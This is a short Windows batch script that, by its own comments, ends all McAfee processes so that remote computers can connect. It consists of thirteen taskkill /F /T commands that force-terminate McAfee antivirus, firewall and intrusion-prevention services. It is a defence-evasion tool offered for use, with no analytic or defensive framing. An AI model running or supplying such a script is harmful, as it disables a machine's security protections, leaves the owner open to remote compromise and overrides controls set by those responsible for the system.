:: Small script to end all McAfee processes
:: This will allow remote computeres to connect to your computer
taskkill /F /IM VsTskMgr.exe /T
taskkill /F /IM UdaterUI.exe /T
taskkill /F /IM naPrdMgr.exe /T
taskkill /F /IM mfevtps.exe /T
taskkill /F /IM mfeann.exe /T
taskkill /F /IM McTray.exe /T
taskkill /F /IM McShield.exe /T
taskkill /F /IM McSACore.exe /T
taskkill /F /IM HIPSvc.exe /T
taskkill /F /IM FrameworkService.exe /T
taskkill /F /IM FireTray.exe /T
taskkill /F /IM FireSvc.exe /T
taskkill /F /IM EngineServer.exe /T
